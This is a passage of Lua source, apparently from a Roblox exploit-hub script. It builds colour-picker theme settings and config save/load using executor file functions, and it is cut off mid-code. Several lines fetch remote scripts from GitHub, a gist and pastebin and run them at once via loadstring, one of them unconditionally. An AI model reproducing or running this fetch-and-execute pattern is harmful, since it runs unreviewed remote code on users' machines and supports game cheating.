ColourWheel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ColourWheel_6.BackgroundTransparency = 1.000
ColourWheel_6.BorderSizePixel = 0
ColourWheel_6.Position = UDim2.new(0.309100389, 0, 0.512530446, 0)
ColourWheel_6.Selectable = false
ColourWheel_6.Size = UDim2.new(0.434449941, 0, 0.86922574, 0)
ColourWheel_6.Image = "http://www.roblox.com/asset/?id=6020299385"

UIAspectRatioConstraint_6.Parent = ColourWheel_6
UIAspectRatioConstraint_6.AspectRatio = 1.000

Picker_6.Name = "Picker"
Picker_6.Parent = ColourWheel_6
Picker_6.AnchorPoint = Vector2.new(0.5, 0.5)
Picker_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Picker_6.BackgroundTransparency = 1.000
Picker_6.BorderSizePixel = 0
Picker_6.Position = UDim2.new(0.5, 0, 0.5, 0)
Picker_6.Size = UDim2.new(0.0900257826, 0, 0.0900257975, 0)
Picker_6.Image = "http://www.roblox.com/asset/?id=3678860011"

DarknessPicker_6.Name = "DarknessPicker"
DarknessPicker_6.Parent = container_6
DarknessPicker_6.Active = false
DarknessPicker_6.AnchorPoint = Vector2.new(0.5, 0.5)
DarknessPicker_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DarknessPicker_6.BackgroundTransparency = 1.000
DarknessPicker_6.BorderSizePixel = 0
DarknessPicker_6.Position = UDim2.new(0.657959282, 0, 0.503847122, 0)
DarknessPicker_6.Selectable = false
DarknessPicker_6.Size = UDim2.new(0.062522307, 0, 0.887292862, 0)
DarknessPicker_6.ZIndex = 2
DarknessPicker_6.Image = "rbxassetid://3570695787"
DarknessPicker_6.ScaleType = Enum.ScaleType.Slice
DarknessPicker_6.SliceCenter = Rect.new(100, 100, 100, 100)
DarknessPicker_6.SliceScale = 0.120

UIGradient_6.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradient_6.Rotation = 90
UIGradient_6.Parent = DarknessPicker_6

Slider_6.Name = "Slider"
Slider_6.Parent = DarknessPicker_6
Slider_6.AnchorPoint = Vector2.new(0.5, 0.5)
Slider_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Slider_6.BackgroundTransparency = 1.000
Slider_6.BorderSizePixel = 0
Slider_6.Position = UDim2.new(0.491197795, 0, 0.0733607039, 0)
Slider_6.Size = UDim2.new(1.28656352, 0, 0.0265010502, 0)
Slider_6.ZIndex = 2
Slider_6.Image = "rbxassetid://3570695787"
Slider_6.ImageColor3 = Color3.fromRGB(255, 74, 74)
Slider_6.ScaleType = Enum.ScaleType.Slice
Slider_6.SliceCenter = Rect.new(100, 100, 100, 100)
Slider_6.SliceScale = 0.120

clickblock_6.Name = "clickblock"
clickblock_6.Parent = _6ElementsIconColourDrop
clickblock_6.AnchorPoint = Vector2.new(0.5, 0.5)
clickblock_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
clickblock_6.BackgroundTransparency = 1.000
clickblock_6.Position = UDim2.new(0.5, 0, 0.49999994, 0)
clickblock_6.Size = UDim2.new(1, 0, 1, 0)
clickblock_6.ZIndex = 2
clickblock_6.Font = Enum.Font.SourceSans
clickblock_6.Text = ""
clickblock_6.TextColor3 = Color3.fromRGB(0, 0, 0)
clickblock_6.TextSize = 14.000
if doesineediscool == true then


local colourWheel = ColourWheel_6
local wheelPicker = Picker_6


local rgb = rgb_7
local uiGradient = uiGradient_6
local darknessPicker = DarknessPicker_6
local darknessSlider = Slider_6

local colourDisplay = indicator_7


local uis = game:GetService("UserInputService")


local buttonDown = false
local movingSlider = false


local function updateColour(centreOfWheel)
	
	
	local colourPickerCentre = Vector2.new(
		wheelPicker.AbsolutePosition.X + (wheelPicker.AbsoluteSize.X/2),
		wheelPicker.AbsolutePosition.Y + (wheelPicker.AbsoluteSize.Y/2)
	)
	local h = (math.pi - math.atan2(colourPickerCentre.Y - centreOfWheel.Y, colourPickerCentre.X - centreOfWheel.X)) / (math.pi * 2)
	
	local s = (centreOfWheel - colourPickerCentre).Magnitude / (colourWheel.AbsoluteSize.X/2)
	
	local v = math.abs((darknessSlider.AbsolutePosition.Y - darknessPicker.AbsolutePosition.Y) / darknessPicker.AbsoluteSize.Y - 1)
	
	
	local hsv = Color3.fromHSV(math.clamp(h, 0, 1), math.clamp(s, 0, 1), math.clamp(v, 0, 1))
	

	colourDisplay.BackgroundColor3 = hsv
	local colors = hsv -- or any random HSV color
-- multiply the components by 255 and get the nearest number
local r,g,b = math.floor((colors.R*255)+0.5),math.floor((colors.G*255)+0.5),math.floor((colors.B*255)+0.5)
	rgb.Text = r..", "..g..", "..b
    COLORTABLE.ElementsIconColour[1] = r
    COLORTABLE.ElementsIconColour[2] = g
    COLORTABLE.ElementsIconColour[3] = b
end


colourWheel.MouseButton1Down:Connect(function()
	buttonDown = true
end)

darknessPicker.MouseButton1Down:Connect(function()
	movingSlider = true
end)


uis.InputEnded:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	
	buttonDown = false
	movingSlider = false
end)


uis.InputChanged:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
	
	
	local mousePos = uis:GetMouseLocation() - Vector2.new(0, game:GetService("GuiService"):GetGuiInset().Y)
	
	local centreOfWheel = Vector2.new(colourWheel.AbsolutePosition.X + (colourWheel.AbsoluteSize.X/2), colourWheel.AbsolutePosition.Y + (colourWheel.AbsoluteSize.Y/2))
	
	local distanceFromWheel = (mousePos - centreOfWheel).Magnitude
	
	
	if distanceFromWheel <= colourWheel.AbsoluteSize.X/2 and buttonDown then
		
		wheelPicker.Position = UDim2.new(0, mousePos.X - colourWheel.AbsolutePosition.X, 0, mousePos.Y - colourWheel.AbsolutePosition.Y)

		
	elseif movingSlider then
		
		darknessSlider.Position = UDim2.new(darknessSlider.Position.X.Scale, 0, 0, 
			math.clamp(
			mousePos.Y - darknessPicker.AbsolutePosition.Y, 
			0, 
			darknessPicker.AbsoluteSize.Y)
		)	
	end
	
	
	updateColour(centreOfWheel)
end)
end
end
start_6e()
---------------

_3ElementsTextColour.Name = "3 ElementsTextColour"
_3ElementsTextColour.Parent = LeftCostum
_3ElementsTextColour.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
_3ElementsTextColour.Size = UDim2.new(0, 221, 0, 22)

title_6.Name = "title"
title_6.Parent = _3ElementsTextColour
title_6.AnchorPoint = Vector2.new(0, 0.5)
title_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
title_6.BackgroundTransparency = 1.000
title_6.Position = UDim2.new(0.1402715, 0, 0.5, 0)
title_6.Size = UDim2.new(0.511312246, 0, 1, 0)
title_6.Font = Enum.Font.GothamMedium
title_6.Text = "Elements Text Colour"
title_6.TextColor3 = Color3.fromRGB(235, 235, 235)
title_6.TextSize = 12.000
title_6.TextXAlignment = Enum.TextXAlignment.Left

indicator_6.Name = "indicator"
indicator_6.Parent = _3ElementsTextColour
indicator_6.AnchorPoint = Vector2.new(1, 0.5)
indicator_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
indicator_6.Position = UDim2.new(1, 0, 0.522727251, 0)
indicator_6.Size = UDim2.new(-0.0328681208, 75, 0.681818187, 0)

corner_16.CornerRadius = UDim.new(0, 3)
corner_16.Name = "corner"
corner_16.Parent = indicator_6

rgb_6.Name = "rgb"
rgb_6.Parent = indicator_6
rgb_6.AnchorPoint = Vector2.new(0.5, 0.5)
rgb_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
rgb_6.BackgroundTransparency = 1.000
rgb_6.Position = UDim2.new(0.5, 0, 0.5, 0)
rgb_6.Size = UDim2.new(1, -14, 1, 0)
rgb_6.Font = Enum.Font.Gotham
rgb_6.Text = "255, 255, 255"
rgb_6.TextColor3 = Color3.fromRGB(12, 12, 12)
rgb_6.TextSize = 11.000

UICorner_6.CornerRadius = UDim.new(0, 3)
UICorner_6.Parent = _3ElementsTextColour

ImageLabel_6.Parent = _3ElementsTextColour
ImageLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_6.BackgroundTransparency = 1.000
ImageLabel_6.Position = UDim2.new(0.0280000009, 0, 0.216000006, -4)
ImageLabel_6.Size = UDim2.new(0, 18, 0, 18)
ImageLabel_6.Image = "rbxassetid://3926307971"
ImageLabel_6.ImageColor3 = Color3.fromRGB(42, 78, 199)
ImageLabel_6.ImageRectOffset = Vector2.new(804, 4)
ImageLabel_6.ImageRectSize = Vector2.new(36, 36)

----------------
function start_4e()
    local _4ElementsTextColourDrop = Instance.new("Frame")
local corner_19 = Instance.new("UICorner")
local container_7 = Instance.new("Frame")
local corner_20 = Instance.new("UICorner")
local ColourWheel_7 = Instance.new("ImageButton")
local UIAspectRatioConstraint_7 = Instance.new("UIAspectRatioConstraint")
local Picker_7 = Instance.new("ImageLabel")
local DarknessPicker_7 = Instance.new("ImageButton")
local UIGradient_7 = Instance.new("UIGradient")
local Slider_7 = Instance.new("ImageLabel")
local clickblock_7 = Instance.new("TextButton")
_4ElementsTextColourDrop.Name = "4 ElementsTextColourDrop"
_4ElementsTextColourDrop.Parent = LeftCostum
_4ElementsTextColourDrop.AnchorPoint = Vector2.new(0.5, 0)
_4ElementsTextColourDrop.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
_4ElementsTextColourDrop.Position = UDim2.new(0.454732507, 0, 0.430672854, 2)
_4ElementsTextColourDrop.Size = UDim2.new(0.909465015, 0, -0.0643519685, 148)
_4ElementsTextColourDrop.Visible = false
_4ElementsTextColourDrop.ZIndex = 3
_3ElementsTextColour.MouseButton1Click:connect(function()
    if _4ElementsTextColourDrop.Visible == true then
        _4ElementsTextColourDrop.Visible = false
    else
        for i,v in pairs(LeftCostum:GetChildren()) do
            if string.find(v.Name, "Drop") then
                v.Visible = false
            end
        end
        _4ElementsTextColourDrop.Visible = true
    end
end)
corner_19.CornerRadius = UDim.new(0, 3)
corner_19.Name = "corner"
corner_19.Parent = _4ElementsTextColourDrop

container_7.Name = "container"
container_7.Parent = _4ElementsTextColourDrop
container_7.AnchorPoint = Vector2.new(0.5, 0.5)
container_7.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
container_7.Position = UDim2.new(0.5, 0, 0.49999994, 0)
container_7.Size = UDim2.new(1.00163865, -4, 0.99999994, -4)
container_7.ZIndex = 3

corner_20.CornerRadius = UDim.new(0, 3)
corner_20.Name = "corner"
corner_20.Parent = container_7

ColourWheel_7.Name = "ColourWheel"
ColourWheel_7.Parent = container_7
ColourWheel_7.Active = false
ColourWheel_7.AnchorPoint = Vector2.new(0.5, 0.5)
ColourWheel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ColourWheel_7.BackgroundTransparency = 1.000
ColourWheel_7.BorderSizePixel = 0
ColourWheel_7.Position = UDim2.new(0.309100389, 0, 0.512530446, 0)
ColourWheel_7.Selectable = false
ColourWheel_7.Size = UDim2.new(0.434449941, 0, 0.86922574, 0)
ColourWheel_7.Image = "http://www.roblox.com/asset/?id=6020299385"

UIAspectRatioConstraint_7.Parent = ColourWheel_7
UIAspectRatioConstraint_7.AspectRatio = 1.000

Picker_7.Name = "Picker"
Picker_7.Parent = ColourWheel_7
Picker_7.AnchorPoint = Vector2.new(0.5, 0.5)
Picker_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Picker_7.BackgroundTransparency = 1.000
Picker_7.BorderSizePixel = 0
Picker_7.Position = UDim2.new(0.5, 0, 0.5, 0)
Picker_7.Size = UDim2.new(0.0900257826, 0, 0.0900257975, 0)
Picker_7.Image = "http://www.roblox.com/asset/?id=3678860011"

DarknessPicker_7.Name = "DarknessPicker"
DarknessPicker_7.Parent = container_7
DarknessPicker_7.Active = false
DarknessPicker_7.AnchorPoint = Vector2.new(0.5, 0.5)
DarknessPicker_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DarknessPicker_7.BackgroundTransparency = 1.000
DarknessPicker_7.BorderSizePixel = 0
DarknessPicker_7.Position = UDim2.new(0.657959282, 0, 0.503847122, 0)
DarknessPicker_7.Selectable = false
DarknessPicker_7.Size = UDim2.new(0.062522307, 0, 0.887292862, 0)
DarknessPicker_7.ZIndex = 2
DarknessPicker_7.Image = "rbxassetid://3570695787"
DarknessPicker_7.ScaleType = Enum.ScaleType.Slice
DarknessPicker_7.SliceCenter = Rect.new(100, 100, 100, 100)
DarknessPicker_7.SliceScale = 0.120

UIGradient_7.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradient_7.Rotation = 90
UIGradient_7.Parent = DarknessPicker_7

Slider_7.Name = "Slider"
Slider_7.Parent = DarknessPicker_7
Slider_7.AnchorPoint = Vector2.new(0.5, 0.5)
Slider_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Slider_7.BackgroundTransparency = 1.000
Slider_7.BorderSizePixel = 0
Slider_7.Position = UDim2.new(0.491197795, 0, 0.0733607039, 0)
Slider_7.Size = UDim2.new(1.28656352, 0, 0.0265010502, 0)
Slider_7.ZIndex = 2
Slider_7.Image = "rbxassetid://3570695787"
Slider_7.ImageColor3 = Color3.fromRGB(255, 74, 74)
Slider_7.ScaleType = Enum.ScaleType.Slice
Slider_7.SliceCenter = Rect.new(100, 100, 100, 100)
Slider_7.SliceScale = 0.120

clickblock_7.Name = "clickblock"
clickblock_7.Parent = _4ElementsTextColourDrop
clickblock_7.AnchorPoint = Vector2.new(0.5, 0.5)
clickblock_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
clickblock_7.BackgroundTransparency = 1.000
clickblock_7.Position = UDim2.new(0.5, 0, 0.49999994, 0)
clickblock_7.Size = UDim2.new(1, 0, 1, 0)
clickblock_7.ZIndex = 2
clickblock_7.Font = Enum.Font.SourceSans
clickblock_7.Text = ""
clickblock_7.TextColor3 = Color3.fromRGB(0, 0, 0)
clickblock_7.TextSize = 14.000
if doesineediscool == true then
local colourWheel = ColourWheel_7
local wheelPicker = Picker_7

local rgb = rgb_6

local darknessPicker = DarknessPicker_7
local darknessSlider = Slider_7

local uiGradient = uiGradient_7

local colourDisplay = indicator_6


local uis = game:GetService("UserInputService")


local buttonDown = false
local movingSlider = false


local function updateColour(centreOfWheel)
	
	
	local colourPickerCentre = Vector2.new(
		wheelPicker.AbsolutePosition.X + (wheelPicker.AbsoluteSize.X/2),
		wheelPicker.AbsolutePosition.Y + (wheelPicker.AbsoluteSize.Y/2)
	)
	local h = (math.pi - math.atan2(colourPickerCentre.Y - centreOfWheel.Y, colourPickerCentre.X - centreOfWheel.X)) / (math.pi * 2)
	
	local s = (centreOfWheel - colourPickerCentre).Magnitude / (colourWheel.AbsoluteSize.X/2)
	
	local v = math.abs((darknessSlider.AbsolutePosition.Y - darknessPicker.AbsolutePosition.Y) / darknessPicker.AbsoluteSize.Y - 1)
	
	
	local hsv = Color3.fromHSV(math.clamp(h, 0, 1), math.clamp(s, 0, 1), math.clamp(v, 0, 1))
	

	colourDisplay.BackgroundColor3 = hsv
	local colors = hsv -- or any random HSV color
-- multiply the components by 255 and get the nearest number
local r,g,b = math.floor((colors.R*255)+0.5),math.floor((colors.G*255)+0.5),math.floor((colors.B*255)+0.5)
	rgb.Text = r..","..g..","..b
    COLORTABLE.ElementsTextColour[1] = r
    COLORTABLE.ElementsTextColour[2] = g
    COLORTABLE.ElementsTextColour[3] = b

end


colourWheel.MouseButton1Down:Connect(function()
	buttonDown = true
end)

darknessPicker.MouseButton1Down:Connect(function()
	movingSlider = true
end)


uis.InputEnded:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	
	buttonDown = false
	movingSlider = false
end)


uis.InputChanged:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
	
	
	local mousePos = uis:GetMouseLocation() - Vector2.new(0, game:GetService("GuiService"):GetGuiInset().Y)
	
	local centreOfWheel = Vector2.new(colourWheel.AbsolutePosition.X + (colourWheel.AbsoluteSize.X/2), colourWheel.AbsolutePosition.Y + (colourWheel.AbsoluteSize.Y/2))
	
	local distanceFromWheel = (mousePos - centreOfWheel).Magnitude
	
	
	if distanceFromWheel <= colourWheel.AbsoluteSize.X/2 and buttonDown then
		
		wheelPicker.Position = UDim2.new(0, mousePos.X - colourWheel.AbsolutePosition.X, 0, mousePos.Y - colourWheel.AbsolutePosition.Y)

		
	elseif movingSlider then
		
		darknessSlider.Position = UDim2.new(darknessSlider.Position.X.Scale, 0, 0, 
			math.clamp(
			mousePos.Y - darknessPicker.AbsolutePosition.Y, 
			0, 
			darknessPicker.AbsoluteSize.Y)
		)	
	end
	
	
	updateColour(centreOfWheel)
end)
end
end
start_4e()

---------------

local DropdownContainer = Instance.new("ScrollingFrame")

local UIListLayout = Instance.new("UIListLayout")
local UICorner_2 = Instance.new("UICorner")
local Dropdown = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local ImageLabel = Instance.new("ImageLabel")
local Option = Instance.new("TextLabel")
local UICorner_4 = Instance.new("UICorner")
local Textboxname = Instance.new("TextLabel")
local dropped = false
DropdownContainer.Name = "Dropdown Container"
DropdownContainer.Parent = UiCostum
DropdownContainer.Active = true
DropdownContainer.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
DropdownContainer.BorderColor3 = Color3.fromRGB(12, 12, 12)
DropdownContainer.Position = UDim2.new(0.512865603, 0, 0.978295922, 0)
DropdownContainer.Size = UDim2.new(0, 220, 0, 99)
DropdownContainer.Visible = false
DropdownContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
DropdownContainer.ScrollBarThickness = 0


UIListLayout.Parent = DropdownContainer
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

UICorner_2.CornerRadius = UDim.new(0, 4)
UICorner_2.Parent = DropdownContainer

Dropdown.Name = "Dropdown"
Dropdown.Parent = UiCostum
Dropdown.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
Dropdown.BorderColor3 = Color3.fromRGB(0, 44, 65)
Dropdown.Position = UDim2.new(0.512865603, 0, 0.870807528, 0)
Dropdown.Size = UDim2.new(0, 220, 0, 43)
Dropdown.Font = Enum.Font.Gotham
Dropdown.Text = ""
Dropdown.TextColor3 = Color3.fromRGB(255, 255, 255)
Dropdown.TextSize = 15.000
if doesineediscool == true then
Dropdown.MouseButton1Click:connect(function()
if dropped == true then
    dropped = false
    DropdownContainer.Visible = false
else
    DropdownContainer.Visible = true
    dropped = true
end
end)
end


UICorner_3.CornerRadius = UDim.new(0, 4)
UICorner_3.Parent = Dropdown

ImageLabel.Parent = Dropdown
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0.0280000009, 0, 0.216000006, 0)
ImageLabel.Size = UDim2.new(0, 18, 0, 18)
ImageLabel.Image = "rbxassetid://3926305904"
ImageLabel.ImageColor3 = Color3.fromRGB(42, 78, 199)
ImageLabel.ImageRectOffset = Vector2.new(644, 364)
ImageLabel.ImageRectSize = Vector2.new(36, 36)

Option.Name = "Option"
Option.Parent = Dropdown
Option.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
Option.BorderColor3 = Color3.fromRGB(28, 28, 28)
Option.Position = UDim2.new(0.786069691, 0, 0.126447409, 0)
Option.Size = UDim2.new(0, 44, 0, 21)
Option.Font = Enum.Font.GothamMedium
Option.Text = "selected option"
Option.TextColor3 = Color3.fromRGB(235, 235, 235)
Option.TextScaled = true
Option.TextSize = 15.000
Option.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Option.TextWrapped = true

UICorner_4.CornerRadius = UDim.new(0, 4)
UICorner_4.Parent = Option

Textboxname.Name = "Textboxname"
Textboxname.Parent = Dropdown
Textboxname.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Textboxname.BackgroundTransparency = 1.000
Textboxname.Position = UDim2.new(0.152557239, 0, 0.0256615616, 0)
Textboxname.Size = UDim2.new(0, 136, 0, 39)
Textboxname.Font = Enum.Font.Gotham
Textboxname.Text = "Primary Custom Theme"
Textboxname.TextColor3 = Color3.fromRGB(235, 235, 235)
Textboxname.TextSize = 13.000
Textboxname.TextWrapped = true
Textboxname.TextXAlignment = Enum.TextXAlignment.Left
if doesineediscool == true then
for i,v in pairs(listfiles("1!ZephyrxUiConfigs")) do
    local TextButton = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
TextButton.Parent = DropdownContainer
TextButton.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
TextButton.BorderColor3 = Color3.fromRGB(0, 44, 65)
TextButton.Position = UDim2.new(-0.371040732, 0, 0, 0)
TextButton.Size = UDim2.new(0, 214, 0, 31)
TextButton.Font = Enum.Font.Gotham
TextButton.Text = v
TextButton.TextColor3 = Color3.fromRGB(235, 235, 235)
TextButton.TextSize = 15.000
TextButton.TextWrapped = true

UICorner.CornerRadius = UDim.new(0, 7)
UICorner.Parent = TextButton

TextButton.MouseButton1Click:connect(
    function()
        Option.Text = v
        DropdownContainer.Visible = false
        dropped = false

        local contents = readfile(v)
if isfile("ZEPHYRXUICOLORS.ZEP") then
    delfile("ZEPHYRXUICOLORS.ZEP")
    writefile("ZEPHYRXUICOLORS.ZEP", contents)
end
    end
)
end
end





ApplyChanges.Name = "Apply Changes"
ApplyChanges.Parent = UiCostum
ApplyChanges.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
ApplyChanges.Position = UDim2.new(0.05, 0,0.934, 0)
ApplyChanges.Size = UDim2.new(0, 147,0, 18)
ApplyChanges.Modal = true
ApplyChanges.Font = Enum.Font.GothamMedium
ApplyChanges.Text = "Apply Changes"
ApplyChanges.TextColor3 = Color3.fromRGB(42, 78, 199)
ApplyChanges.TextSize = 14.000
ApplyChanges.TextWrapped = true
local CSstroke = Instance.new("UIStroke")
CSstroke.Parent = ApplyChanges
CSstroke.Name = "CStroke"
CSstroke.Enabled = true
CSstroke.Color = Color3.fromRGB(243,243,243)
CSstroke.Thickness = 1
CSstroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
CSstroke.LineJoinMode = Enum.LineJoinMode.Round

local CSsGrad = Instance.new("UIGradient")
CSsGrad.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(79, 126, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(161, 84, 255))}
CSsGrad.Rotation = 20
CSsGrad.Name = "CSGrad"
CSsGrad.Parent = CSstroke
if doesineediscool == true then
ApplyChanges.MouseButton1Click:connect(function()
    LIB:DestroyLib()
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ECLIPSEXHUB/ECLIPSE-X/main/ECLIPSE%20X.txt", true))()
    end)
end)
end
UICornerapplychanges.CornerRadius = UDim.new(0, 3)
UICornerapplychanges.Name = "UICornerapplychanges"
UICornerapplychanges.Parent = ApplyChanges



local ConfigNAme = Instance.new("TextBox")
local ConfigNamecc = Instance.new("UICorner")

--Properties:

ConfigNAme.Name = "Config NAme"
ConfigNAme.Parent = UiCostum
ConfigNAme.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
ConfigNAme.Position = UDim2.new(0.051, 0,0.872, -23)
ConfigNAme.Size = UDim2.new(0, 147,0, 18)
ConfigNAme.Font = Enum.Font.GothamMedium
ConfigNAme.PlaceholderColor3 = Color3.fromRGB(42, 78, 199)
ConfigNAme.PlaceholderText = "Config Name..."
ConfigNAme.ShowNativeInput = false
ConfigNAme.Text = ""
ConfigNAme.TextColor3 = Color3.fromRGB(42, 78, 199)
ConfigNAme.TextSize = 14.000

ConfigNamecc.CornerRadius = UDim.new(0, 3)
ConfigNamecc.Name = "ConfigNamecc"
ConfigNamecc.Parent = ConfigNAme


SaveConfig.Name = "Save Config"
SaveConfig.Parent = UiCostum
SaveConfig.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
SaveConfig.Position = UDim2.new(0.051, 0,0.872, 0)
SaveConfig.Size = UDim2.new(0, 147,0, 18)
SaveConfig.Modal = true
SaveConfig.Font = Enum.Font.GothamMedium
SaveConfig.Text = "Save Config"
SaveConfig.TextColor3 = Color3.fromRGB(42, 78, 199)
SaveConfig.TextSize = 14.000
SaveConfig.TextWrapped = true
local CSsstroke = Instance.new("UIStroke")
CSsstroke.Parent = SaveConfig
CSsstroke.Name = "CStroke"
CSsstroke.Enabled = true
CSsstroke.Color = Color3.fromRGB(243,243,243)
CSsstroke.Thickness = 1
CSsstroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
CSsstroke.LineJoinMode = Enum.LineJoinMode.Round

local CSssGrad = Instance.new("UIGradient")
CSssGrad.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(79, 126, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(161, 84, 255))}
CSssGrad.Rotation = 20
CSssGrad.Name = "CSGrad"
CSssGrad.Parent = CSsstroke
if doesineediscool == true then
SaveConfig.MouseButton1Click:connect(function()
    if ConfigNAme.Text == "" then
        ConfigNAme.Text = "NAME PLS!"
        wait(1)
        ConfigNAme.Text = ""
    else
    local HttpService = game:GetService("HttpService")
    if isfolder("1!ZephyrxUiConfigs") then
    writefile("1!ZephyrxUiConfigs/"..ConfigNAme.Text..".ZEP", HttpService:JSONEncode(COLORTABLE))
    else
        makefolder("1!ZephyrxUiConfigs")
        writefile("1!ZephyrxUiConfigs/"..ConfigNAme.Text..".ZEP", HttpService:JSONEncode(COLORTABLE))
    end
    ConfigNAme.Text = ""
end
end)
end
UICornerSavEConfig.CornerRadius = UDim.new(0, 3)
UICornerSavEConfig.Name = "UICornerSavEConfig"
UICornerSavEConfig.Parent = SaveConfig
if doesineediscool == false then
    local BlurFrame = Instance.new("Frame")
local UICorner63456645456 = Instance.new("UICorner")
local CPrompt = Instance.new("ImageLabel")
local CGlow = Instance.new("ImageLabel")
local CPTitle = Instance.new("TextLabel")
local CPDesc = Instance.new("TextLabel")
local CPrem = Instance.new("TextButton")
local CCorner = Instance.new("UICorner")

BlurFrame.Name = "BlurFrame"
BlurFrame.Parent = UiCostum
BlurFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
BlurFrame.BackgroundTransparency = 0.200
BlurFrame.Size = UDim2.new(0, 486, 0, 402)
BlurFrame.Visible = true

UICorner63456645456.Name = "UICorner63456645456"
UICorner63456645456.Parent = BlurFrame

CPrompt.Name = "CPrompt"
CPrompt.Parent = BlurFrame
CPrompt.AnchorPoint = Vector2.new(0.5, 0.5)
CPrompt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CPrompt.BackgroundTransparency = 1.000
CPrompt.Position = UDim2.new(0.497669011, 0, 0.46875, 0)
CPrompt.Size = UDim2.new(0, 239, 0, 127)
CPrompt.Image = "rbxassetid://3570695787"
CPrompt.ImageColor3 = Color3.fromRGB(27, 27, 27)
CPrompt.ScaleType = Enum.ScaleType.Slice
CPrompt.SliceCenter = Rect.new(100, 100, 100, 100)
CPrompt.SliceScale = 0.120

CGlow.Name = "CGlow"
CGlow.Parent = CPrompt
CGlow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CGlow.BackgroundTransparency = 1.000
CGlow.Position = UDim2.new(0, -15, 0, -15)
CGlow.Size = UDim2.new(1, 30, 1, 30)
CGlow.Image = "rbxassetid://5028857084"
CGlow.ImageColor3 = Color3.fromRGB(0, 0, 0)
CGlow.ImageTransparency = 0.500
CGlow.ScaleType = Enum.ScaleType.Slice
CGlow.SliceCenter = Rect.new(24, 24, 276, 276)

CPTitle.Name = "CPTitle"
CPTitle.Parent = CPrompt
CPTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CPTitle.BackgroundTransparency = 1.000
CPTitle.Position = UDim2.new(0.301255226, 0, 0.05511811, 0)
CPTitle.Size = UDim2.new(0, 94, 0, 31)
CPTitle.Font = Enum.Font.Gotham
CPTitle.Text = "Uh Oh!"
CPTitle.TextColor3 = Color3.fromRGB(253, 253, 253)
CPTitle.TextSize = 17.000

CPDesc.Name = "CPDesc"
CPDesc.Parent = CPrompt
CPDesc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CPDesc.BackgroundTransparency = 1.000
CPDesc.Position = UDim2.new(0.112968668, 0, 0.299212605, 0)
CPDesc.Size = UDim2.new(0, 187, 0, 31)
CPDesc.Font = Enum.Font.Gotham
CPDesc.Text = "UI Customization is only avaliable to Zephyr X <font color=\"#3968fc\">Premium</font> members!"
CPDesc.TextColor3 = Color3.fromRGB(253, 253, 253)
CPDesc.TextSize = 12.000
CPDesc.RichText = true
CPDesc.TextWrapped = true
local s = loadstring(game:HttpGet("https://gist.githubusercontent.com/ECLIPSEXHUB/2eb5faec47ed518ae47914744b6c1251/raw/", true))()
CPrem.Name = "CPrem"
CPrem.Parent = CPrompt
CPrem.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CPrem.BackgroundTransparency = 1.000
CPrem.Position = UDim2.new(0.259414196, 0, 0.606299162, 0)
CPrem.Size = UDim2.new(0, 116, 0, 32)
CPrem.Font = Enum.Font.Gotham
CPrem.Text = "Buy Premium"
CPrem.TextColor3 = Color3.fromRGB(238, 238, 238)
CPrem.TextSize = 14.000

CPrem.MouseButton1Click:connect(function()
setclipboard("https://dsc.gg/zephyr-x")
loadstring(game:HttpGet("https://pastebin.com/raw/NCgp7Wc6", true))()
